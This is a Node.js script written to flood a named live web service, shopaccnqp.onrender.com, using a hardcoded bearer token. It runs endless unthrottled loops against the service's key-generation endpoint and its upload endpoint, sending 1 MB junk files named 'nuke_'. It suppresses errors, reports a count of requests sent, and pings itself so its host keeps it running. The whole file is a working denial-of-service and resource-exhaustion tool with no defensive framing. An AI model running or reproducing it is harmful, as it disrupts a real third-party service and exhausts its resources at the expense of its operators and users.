const http = require('http');
const https = require('https');
const { URL } = require('url');
const targetUrl = process.env.TARGET_URL || 'https://shopaccnqp.onrender.com';
const port = process.env.PORT || 10000;
const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InNoOGg5cXdjN3QiLCJ1c2VybmFtZSI6ImdheSIsImlhdCI6MTc4MzY3MTI3NywiZXhwIjoxNzg2MjYzMjc3fQ.zpOA2DQKkM0PG_W1Z6Md-kqK9jr5PNTnkFe9SVnhq7o';
const bigContent = 'A'.repeat(1048576);
let reqCount = 0;

const parsedTarget = new URL(targetUrl);
const isHttps = parsedTarget.protocol === 'https:';
const transport = isHttps ? https : http;

const randStr = (len) => {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < len; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
  return result;
};

const quickFire = (method, path, headers, body) => {
  const options = {
    hostname: parsedTarget.hostname,
    port: parsedTarget.port || (isHttps ? 443 : 80),
    path: path,
    method: method,
    headers: headers,
  };
  const req = transport.request(options);
  req.on('error', () => {});
  if (body) req.write(body);
  req.end();
};

const spamKey = () => {
  const send = () => {
    const headers = {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ' + token,
    };
    quickFire('POST', '/api/keys/generate', headers, JSON.stringify({ durationMs: 604800000 }));
    reqCount++;
    setImmediate(send);
  };
  send();
};

const spamCode = () => {
  const send = () => {
    const headers = {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ' + token,
    };
    quickFire('POST', '/api/uploads/code', headers, JSON.stringify({
      content: bigContent,
      filename: 'nuke_' + Date.now() + '_' + randStr(6) + '.txt',
      note: ''
    }));
    reqCount++;
    setImmediate(send);
  };
  send();
};

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Requests sent: ' + reqCount);
});

server.listen(port, () => {
  spamKey();
  spamCode();
  setInterval(() => {
    http.get(`http://localhost:${port}`, () => {}).on('error', () => {});
  }, 600000);
});
